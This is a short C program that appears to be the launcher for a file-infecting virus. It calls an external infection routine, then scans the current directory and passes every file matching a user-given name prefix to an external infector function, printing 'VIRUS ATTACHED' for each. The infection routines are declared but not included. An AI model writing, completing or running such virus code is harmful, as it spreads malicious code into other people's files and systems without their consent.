#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

extern void infection();
extern void infector(char *filename);

void process_files_with_prefix(const char *prefix) {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (strncmp(dir->d_name, prefix, strlen(prefix)) == 0) {
                printf("%s - VIRUS ATTACHED\n", dir->d_name);
                infector(dir->d_name);
            }
        }
        closedir(d);
    } else {
        perror("opendir");
        exit(1);
    }
}

int main(int argc, char *argv[]) {
    if (argc > 1 && strncmp(argv[1], "-a", 2) == 0) {
        const char *prefix = argv[1] + 2;
        infection();
        process_files_with_prefix(prefix);
    } else {
        fprintf(stderr, "Usage: %s -a{prefix}\n", argv[0]);
        return 1;
    }
    return 0;
}